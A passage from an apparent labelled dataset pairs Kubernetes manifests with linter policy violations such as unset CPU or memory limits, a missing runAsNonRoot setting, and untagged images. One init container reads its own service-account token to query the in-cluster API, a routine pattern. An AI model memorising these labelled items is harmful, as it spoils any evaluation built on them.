dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_DOMAIN\n          value: network.micro.mu\n        command:\n        - sh\n        - -c\n        args:\n        - export ADDRESS=\"$(cat /node_info/ip):$MICRO_NETWORK_SVC_NODE_PORT\"; /micro\n          network --gateway=\"$ADDRESS\" --advertise=\"$ADDRESS\"\n        image: micro/micro\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        ports:\n        - containerPort: 8080\n          name: service-port\n        - containerPort: 8085\n          name: network-port\n          protocol: UDP\n      initContainers:\n      - name: init-network-env\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: microhq/curljq\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        command:\n        - sh\n        - -c\n        args:\n        - 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl\n          -k -X GET -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$POD_NAMESPACE/services/micro-network\n          | jq -r ''if .status.loadBalancer.ingress[0].hostname != null then .status.loadBalancer.ingress[0].hostname\n          else .status.loadBalancer.ingress[0].ip end'' > /node_info/ip'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"network\" has cpu request 0"
  },
  {
    "id": "9602",
    "manifest_path": "data/manifests/the_stack_sample/sample_3661.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-network\n  labels:\n    micro: runtime\n    name: micro-network\n  annotations:\n    name: go.micro.network\n    version: latest\n    source: github.com/micro-in-cn/x-gateway\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-network\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-network\n        micro: runtime\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: name\n                  operator: In\n                  values:\n                  - micro-network\n              topologyKey: kubernetes.io/hostname\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: network\n        env:\n        - name: MICRO_NETWORK_TOKEN\n          value: micro.mu\n        - name: MICRO_NETWORK_ADVERTISE_STRATEGY\n          value: best\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_NETWORK_NODES\n          value: network.micro.mu\n        - name: MICRO_NETWORK_SVC_NODE_PORT\n          value: '8085'\n        - name: MICRO_NETWORK_DNS_REMOVE_DOMAIN\n          value: network.micro.mu\n        - name: MICRO_NETWORK_DNS_REMOVE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_DOMAIN\n          value: network.micro.mu\n        command:\n        - sh\n        - -c\n        args:\n        - export ADDRESS=\"$(cat /node_info/ip):$MICRO_NETWORK_SVC_NODE_PORT\"; /micro\n          network --gateway=\"$ADDRESS\" --advertise=\"$ADDRESS\"\n        image: micro/micro\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        ports:\n        - containerPort: 8080\n          name: service-port\n        - containerPort: 8085\n          name: network-port\n          protocol: UDP\n      initContainers:\n      - name: init-network-env\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: microhq/curljq\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        command:\n        - sh\n        - -c\n        args:\n        - 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl\n          -k -X GET -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$POD_NAMESPACE/services/micro-network\n          | jq -r ''if .status.loadBalancer.ingress[0].hostname != null then .status.loadBalancer.ingress[0].hostname\n          else .status.loadBalancer.ingress[0].ip end'' > /node_info/ip'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-network-env\" has memory limit 0"
  },
  {
    "id": "9603",
    "manifest_path": "data/manifests/the_stack_sample/sample_3661.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-network\n  labels:\n    micro: runtime\n    name: micro-network\n  annotations:\n    name: go.micro.network\n    version: latest\n    source: github.com/micro-in-cn/x-gateway\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-network\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-network\n        micro: runtime\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: name\n                  operator: In\n                  values:\n                  - micro-network\n              topologyKey: kubernetes.io/hostname\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: network\n        env:\n        - name: MICRO_NETWORK_TOKEN\n          value: micro.mu\n        - name: MICRO_NETWORK_ADVERTISE_STRATEGY\n          value: best\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_NETWORK_NODES\n          value: network.micro.mu\n        - name: MICRO_NETWORK_SVC_NODE_PORT\n          value: '8085'\n        - name: MICRO_NETWORK_DNS_REMOVE_DOMAIN\n          value: network.micro.mu\n        - name: MICRO_NETWORK_DNS_REMOVE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_DOMAIN\n          value: network.micro.mu\n        command:\n        - sh\n        - -c\n        args:\n        - export ADDRESS=\"$(cat /node_info/ip):$MICRO_NETWORK_SVC_NODE_PORT\"; /micro\n          network --gateway=\"$ADDRESS\" --advertise=\"$ADDRESS\"\n        image: micro/micro\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        ports:\n        - containerPort: 8080\n          name: service-port\n        - containerPort: 8085\n          name: network-port\n          protocol: UDP\n      initContainers:\n      - name: init-network-env\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: microhq/curljq\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        command:\n        - sh\n        - -c\n        args:\n        - 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl\n          -k -X GET -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$POD_NAMESPACE/services/micro-network\n          | jq -r ''if .status.loadBalancer.ingress[0].hostname != null then .status.loadBalancer.ingress[0].hostname\n          else .status.loadBalancer.ingress[0].ip end'' > /node_info/ip'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"network\" has memory limit 0"
  },
  {
    "id": "9604",
    "manifest_path": "data/manifests/the_stack_sample/sample_3670.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: subscriptions\n  name: subscriptions\n  namespace: gfw\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: subscriptions\n  template:\n    metadata:\n      labels:\n        name: subscriptions\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: type\n                operator: In\n                values:\n                - apps\n      containers:\n      - args:\n        - start\n        env:\n        - name: PORT\n          value: '3600'\n        - name: LOGGER_LEVEL\n          value: info\n        - name: NODE_ENV\n          value: dev\n        - name: NODE_PATH\n          value: app/src\n        - name: LOCAL_URL\n          value: http://subscriptions.gfw.svc.cluster.local:3600\n        - name: MONGO_USE_UNIFIED_TOPOLOGY\n          value: 'false'\n        - name: MONGO_URI\n          valueFrom:\n            secretKeyRef:\n              key: SUBSCRIPTIONS_MONGO_URI\n              name: dbsecrets\n        - name: CT_URL\n          valueFrom:\n            secretKeyRef:\n              key: CT_URL\n              name: mssecrets\n        - name: CT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: CT_TOKEN\n              name: mssecrets\n        - name: CT_REGISTER_MODE\n          valueFrom:\n            secretKeyRef:\n              key: CT_REGISTER_MODE\n              name: mssecrets\n        - name: API_VERSION\n          valueFrom:\n            secretKeyRef:\n              key: API_VERSION\n              name: mssecrets\n        - name: FLAGSHIP_URL\n          value: http://staging.globalforestwatch.org\n        - name: API_GATEWAY_EXTERNAL_URL\n          value: http://staging-api.globalforestwatch.org\n        - name: API_URL\n          value: http://staging-api.globalforestwatch.org\n        - name: RW_FLAGSHIP_URL_PREPRODUCTION\n          value: http://preproduction.resourcewatch.org\n        - name: RW_FLAGSHIP_URL_PRODUCTION\n          value: http://resourcewatch.org\n        - name: RW_FLAGSHIP_URL_STAGING\n          value: http://staging.resourcewatch.org\n        - name: API_GATEWAY_QUEUE_NAME\n          value: mail_staging\n        - name: REDIS_URL\n          valueFrom:\n            secretKeyRef:\n              key: REDIS_URI\n              name: dbsecrets\n        - name: REDIS_PORT_6379_TCP_ADDR\n          value: localhost\n        - name: REDIS_PORT_6379_TCP_PORT\n          value: '6379'\n        - name: SPARKPOST_KEY\n          valueFrom:\n            secretKeyRef:\n              key: SPARKPOST_KEY\n              name: mssecrets\n        - name: SLACK_KEY\n          valueFrom:\n            secretKeyRef:\n              key: SLACK_KEY\n              name: mssecrets\n        - name: SLACK_CHANNEL_ID\n          valueFrom:\n            secretKeyRef:\n              key: SLACK_CHANNEL_ID\n              name: mssecrets\n        - name: FASTLY_ENABLED\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_ENABLED\n              name: mssecrets\n        - name: FASTLY_APIKEY\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_APIKEY\n              name: mssecrets\n              optional: true\n        - name: FASTLY_SERVICEID\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_SERVICEID\n              name: mssecrets\n              optional: true\n        - name: DATA_API_URL\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_URL\n              name: mssecrets\n        - name: DATA_API_KEY\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_KEY\n              name: mssecrets\n        - name: DATA_API_ORIGIN\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_ORIGIN\n              name: mssecrets\n        image: gfwdockerhub/subscriptions\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 3600\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: subscriptions\n        ports:\n        - containerPort: 3600\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 3600\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          requests:\n            cpu: '0'\n            memory: '0'\n      securityContext: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"subscriptions\" is using an invalid container image, \"gfwdockerhub/subscriptions\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9605",
    "manifest_path": "data/manifests/the_stack_sample/sample_3670.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: subscriptions\n  name: subscriptions\n  namespace: gfw\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: subscriptions\n  template:\n    metadata:\n      labels:\n        name: subscriptions\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: type\n                operator: In\n                values:\n                - apps\n      containers:\n      - args:\n        - start\n        env:\n        - name: PORT\n          value: '3600'\n        - name: LOGGER_LEVEL\n          value: info\n        - name: NODE_ENV\n          value: dev\n        - name: NODE_PATH\n          value: app/src\n        - name: LOCAL_URL\n          value: http://subscriptions.gfw.svc.cluster.local:3600\n        - name: MONGO_USE_UNIFIED_TOPOLOGY\n          value: 'false'\n        - name: MONGO_URI\n          valueFrom:\n            secretKeyRef:\n              key: SUBSCRIPTIONS_MONGO_URI\n              name: dbsecrets\n        - name: CT_URL\n          valueFrom:\n            secretKeyRef:\n              key: CT_URL\n              name: mssecrets\n        - name: CT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: CT_TOKEN\n              name: mssecrets\n        - name: CT_REGISTER_MODE\n          valueFrom:\n            secretKeyRef:\n              key: CT_REGISTER_MODE\n              name: mssecrets\n        - name: API_VERSION\n          valueFrom:\n            secretKeyRef:\n              key: API_VERSION\n              name: mssecrets\n        - name: FLAGSHIP_URL\n          value: http://staging.globalforestwatch.org\n        - name: API_GATEWAY_EXTERNAL_URL\n          value: http://staging-api.globalforestwatch.org\n        - name: API_URL\n          value: http://staging-api.globalforestwatch.org\n        - name: RW_FLAGSHIP_URL_PREPRODUCTION\n          value: http://preproduction.resourcewatch.org\n        - name: RW_FLAGSHIP_URL_PRODUCTION\n          value: http://resourcewatch.org\n        - name: RW_FLAGSHIP_URL_STAGING\n          value: http://staging.resourcewatch.org\n        - name: API_GATEWAY_QUEUE_NAME\n          value: mail_staging\n        - name: REDIS_URL\n          valueFrom:\n            secretKeyRef:\n              key: REDIS_URI\n              name: dbsecrets\n        - name: REDIS_PORT_6379_TCP_ADDR\n          value: localhost\n        - name: REDIS_PORT_6379_TCP_PORT\n          value: '6379'\n        - name: SPARKPOST_KEY\n          valueFrom:\n            secretKeyRef:\n              key: SPARKPOST_KEY\n              name: mssecrets\n        - name: SLACK_KEY\n          valueFrom:\n            secretKeyRef:\n              key: SLACK_KEY\n              name: mssecrets\n        - name: SLACK_CHANNEL_ID\n          valueFrom:\n            secretKeyRef:\n              key: SLACK_CHANNEL_ID\n              name: mssecrets\n        - name: FASTLY_ENABLED\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_ENABLED\n              name: mssecrets\n        - name: FASTLY_APIKEY\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_APIKEY\n              name: mssecrets\n              optional: true\n        - name: FASTLY_SERVICEID\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_SERVICEID\n              name: mssecrets\n              optional: true\n        - name: DATA_API_URL\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_URL\n              name: mssecrets\n        - name: DATA_API_KEY\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_KEY\n              name: mssecrets\n        - name: DATA_API_ORIGIN\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_ORIGIN\n              name: mssecrets\n        image: gfwdockerhub/subscriptions\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 3600\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: subscriptions\n        ports:\n        - containerPort: 3600\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 3600\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          requests:\n            cpu: '0'\n            memory: '0'\n      securityContext: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"subscriptions\" does not have a read-only root file system"
  },
  {
    "id": "9606",
    "manifest_path": "data/manifests/the_stack_sample/sample_3670.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: subscriptions\n  name: subscriptions\n  namespace: gfw\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: subscriptions\n  template:\n    metadata:\n      labels:\n        name: subscriptions\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: type\n                operator: In\n                values:\n                - apps\n      containers:\n      - args:\n        - start\n        env:\n        - name: PORT\n          value: '3600'\n        - name: LOGGER_LEVEL\n          value: info\n        - name: NODE_ENV\n          value: dev\n        - name: NODE_PATH\n          value: app/src\n        - name: LOCAL_URL\n          value: http://subscriptions.gfw.svc.cluster.local:3600\n        - name: MONGO_USE_UNIFIED_TOPOLOGY\n          value: 'false'\n        - name: MONGO_URI\n          valueFrom:\n            secretKeyRef:\n              key: SUBSCRIPTIONS_MONGO_URI\n              name: dbsecrets\n        - name: CT_URL\n          valueFrom:\n            secretKeyRef:\n              key: CT_URL\n              name: mssecrets\n        - name: CT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: CT_TOKEN\n              name: mssecrets\n        - name: CT_REGISTER_MODE\n          valueFrom:\n            secretKeyRef:\n              key: CT_REGISTER_MODE\n              name: mssecrets\n        - name: API_VERSION\n          valueFrom:\n            secretKeyRef:\n              key: API_VERSION\n              name: mssecrets\n        - name: FLAGSHIP_URL\n          value: http://staging.globalforestwatch.org\n        - name: API_GATEWAY_EXTERNAL_URL\n          value: http://staging-api.globalforestwatch.org\n        - name: API_URL\n          value: http://staging-api.globalforestwatch.org\n        - name: RW_FLAGSHIP_URL_PREPRODUCTION\n          value: http://preproduction.resourcewatch.org\n        - name: RW_FLAGSHIP_URL_PRODUCTION\n          value: http://resourcewatch.org\n        - name: RW_FLAGSHIP_URL_STAGING\n          value: http://staging.resourcewatch.org\n        - name: API_GATEWAY_QUEUE_NAME\n          value: mail_staging\n        - name: REDIS_URL\n          valueFrom:\n            secretKeyRef:\n              key: REDIS_URI\n              name: dbsecrets\n        - name: REDIS_PORT_6379_TCP_ADDR\n          value: localhost\n        - name: REDIS_PORT_6379_TCP_PORT\n          value: '6379'\n        - name: SPARKPOST_KEY\n          valueFrom:\n            secretKeyRef:\n              key: SPARKPOST_KEY\n              name: mssecrets\n        - name: SLACK_KEY\n          valueFrom:\n            secretKeyRef:\n              key: SLACK_KEY\n              name: mssecrets\n        - name: SLACK_CHANNEL_ID\n          valueFrom:\n            secretKeyRef:\n              key: SLACK_CHANNEL_ID\n              name: mssecrets\n        - name: FASTLY_ENABLED\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_ENABLED\n              name: mssecrets\n        - name: FASTLY_APIKEY\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_APIKEY\n              name: mssecrets\n              optional: true\n        - name: FASTLY_SERVICEID\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_SERVICEID\n              name: mssecrets\n              optional: true\n        - name: DATA_API_URL\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_URL\n              name: mssecrets\n        - name: DATA_API_KEY\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_KEY\n              name: mssecrets\n        - name: DATA_API_ORIGIN\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_ORIGIN\n              name: mssecrets\n        image: gfwdockerhub/subscriptions\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 3600\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: subscriptions\n        ports:\n        - containerPort: 3600\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 3600\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          requests:\n            cpu: '0'\n            memory: '0'\n      securityContext: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"subscriptions\" is not set to runAsNonRoot"
  },
  {
    "id": "9607",
    "manifest_path": "data/manifests/the_stack_sample/sample_3670.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: subscriptions\n  name: subscriptions\n  namespace: gfw\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: subscriptions\n  template:\n    metadata:\n      labels:\n        name: subscriptions\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: type\n                operator: In\n                values:\n                - apps\n      containers:\n      - args:\n        - start\n        env:\n        - name: PORT\n          value: '3600'\n        - name: LOGGER_LEVEL\n          value: info\n        - name: NODE_ENV\n          value: dev\n        - name: NODE_PATH\n          value: app/src\n        - name: LOCAL_URL\n          value: http://subscriptions.gfw.svc.cluster.local:3600\n        - name: MONGO_USE_UNIFIED_TOPOLOGY\n          value: 'false'\n        - name: MONGO_URI\n          valueFrom:\n            secretKeyRef:\n              key: SUBSCRIPTIONS_MONGO_URI\n              name: dbsecrets\n        - name: CT_URL\n          valueFrom:\n            secretKeyRef:\n              key: CT_URL\n              name: mssecrets\n        - name: CT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: CT_TOKEN\n              name: mssecrets\n        - name: CT_REGISTER_MODE\n          valueFrom:\n            secretKeyRef:\n              key: CT_REGISTER_MODE\n              name: mssecrets\n        - name: API_VERSION\n          valueFrom:\n            secretKeyRef:\n              key: API_VERSION\n              name: mssecrets\n        - name: FLAGSHIP_URL\n          value: http://staging.globalforestwatch.org\n        - name: API_GATEWAY_EXTERNAL_URL\n          value: http://staging-api.globalforestwatch.org\n        - name: API_URL\n          value: http://staging-api.globalforestwatch.org\n        - name: RW_FLAGSHIP_URL_PREPRODUCTION\n          value: http://preproduction.resourcewatch.org\n        - name: RW_FLAGSHIP_URL_PRODUCTION\n          value: http://resourcewatch.org\n        - name: RW_FLAGSHIP_URL_STAGING\n          value: http://staging.resourcewatch.org\n        - name: API_GATEWAY_QUEUE_NAME\n          value: mail_staging\n        - name: REDIS_URL\n          valueFrom:\n            secretKeyRef:\n              key: REDIS_URI\n              name: dbsecrets\n        - name: REDIS_PORT_6379_TCP_ADDR\n          value: localhost\n        - name: REDIS_PORT_6379_TCP_PORT\n          value: '6379'\n        - name: SPARKPOST_KEY\n          valueFrom:\n            secretKeyRef:\n              key: SPARKPOST_KEY\n              name: mssecrets\n        - name: SLACK_KEY\n          valueFrom:\n            secretKeyRef:\n              key: SLACK_KEY\n              name: mssecrets\n        - name: SLACK_CHANNEL_ID\n          valueFrom:\n            secretKeyRef:\n              key: SLACK_CHANNEL_ID\n              name: mssecrets\n        - name: FASTLY_ENABLED\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_ENABLED\n              name: mssecrets\n        - name: FASTLY_APIKEY\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_APIKEY\n              name: mssecrets\n              optional: true\n        - name: FASTLY_SERVICEID\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_SERVICEID\n              name: mssecrets\n              optional: true\n        - name: DATA_API_URL\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_URL\n              name: mssecrets\n        - name: DATA_API_KEY\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_KEY\n              name: mssecrets\n        - name: DATA_API_ORIGIN\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_ORIGIN\n              name: mssecrets\n        image: gfwdockerhub/subscriptions\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 3600\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: subscriptions\n        ports:\n        - containerPort: 3600\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 3600\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          requests:\n            cpu: '0'\n            memory: '0'\n      securityContext: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"subscriptions\" has cpu request 0"
  },
  {
    "id": "9608",
    "manifest_path": "data/manifests/the_stack_sample/sample_3670.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: subscriptions\n  name: subscriptions\n  namespace: gfw\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: subscriptions\n  template:\n    metadata:\n      labels:\n        name: subscriptions\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: type\n                operator: In\n                values:\n                - apps\n      containers:\n      - args:\n        - start\n        env:\n        - name: PORT\n          value: '3600'\n        - name: LOGGER_LEVEL\n          value: info\n        - name: NODE_ENV\n          value: dev\n        - name: NODE_PATH\n          value: app/src\n        - name: LOCAL_URL\n          value: http://subscriptions.gfw.svc.cluster.local:3600\n        - name: MONGO_USE_UNIFIED_TOPOLOGY\n          value: 'false'\n        - name: MONGO_URI\n          valueFrom:\n            secretKeyRef:\n              key: SUBSCRIPTIONS_MONGO_URI\n              name: dbsecrets\n        - name: CT_URL\n          valueFrom:\n            secretKeyRef:\n              key: CT_URL\n              name: mssecrets\n        - name: CT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: CT_TOKEN\n              name: mssecrets\n        - name: CT_REGISTER_MODE\n          valueFrom:\n            secretKeyRef:\n              key: CT_REGISTER_MODE\n              name: mssecrets\n        - name: API_VERSION\n          valueFrom:\n            secretKeyRef:\n              key: API_VERSION\n              name: mssecrets\n        - name: FLAGSHIP_URL\n          value: http://staging.globalforestwatch.org\n        - name: API_GATEWAY_EXTERNAL_URL\n          value: http://staging-api.globalforestwatch.org\n        - name: API_URL\n          value: http://staging-api.globalforestwatch.org\n        - name: RW_FLAGSHIP_URL_PREPRODUCTION\n          value: http://preproduction.resourcewatch.org\n        - name: RW_FLAGSHIP_URL_PRODUCTION\n          value: http://resourcewatch.org\n        - name: RW_FLAGSHIP_URL_STAGING\n          value: http://staging.resourcewatch.org\n        - name: API_GATEWAY_QUEUE_NAME\n          value: mail_staging\n        - name: REDIS_URL\n          valueFrom:\n            secretKeyRef:\n              key: REDIS_URI\n              name: dbsecrets\n        - name: REDIS_PORT_6379_TCP_ADDR\n          value: localhost\n        - name: REDIS_PORT_6379_TCP_PORT\n          value: '6379'\n        - name: SPARKPOST_KEY\n          valueFrom:\n            secretKeyRef:\n              key: SPARKPOST_KEY\n              name: mssecrets\n        - name: SLACK_KEY\n          valueFrom:\n            secretKeyRef:\n              key: SLACK_KEY\n              name: mssecrets\n        - name: SLACK_CHANNEL_ID\n          valueFrom:\n            secretKeyRef:\n              key: SLACK_CHANNEL_ID\n              name: mssecrets\n        - name: FASTLY_ENABLED\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_ENABLED\n              name: mssecrets\n        - name: FASTLY_APIKEY\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_APIKEY\n              name: mssecrets\n              optional: true\n        - name: FASTLY_SERVICEID\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_SERVICEID\n              name: mssecrets\n              optional: true\n        - name: DATA_API_URL\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_URL\n              name: mssecrets\n        - name: DATA_API_KEY\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_KEY\n              name: mssecrets\n        - name: DATA_API_ORIGIN\n          valueFrom:\n            secretKeyRef:\n              key: DATA_API_ORIGIN\n              name: mssecrets\n        image: gfwdockerhub/subscriptions\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 3600\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: subscriptions\n        ports:\n        - containerPort: 3600\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 3600\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          requests:\n            cpu: '0'\n            memory: '0'\n      securityContext: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"subscriptions\" has memory limit 0"
  },
  {
    "id": "9609",
    "manifest_path": "data/manifests/the_stack_sample/sample_3672.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: redis\n  labels:\n    name: redis-service\n    app: demo-voting-app\nspec:\n  ports:\n  - port: 6379\n    targetPort: 6379\n  selector:\n    name: redis-pod\n    app: demo-voting-app\n",
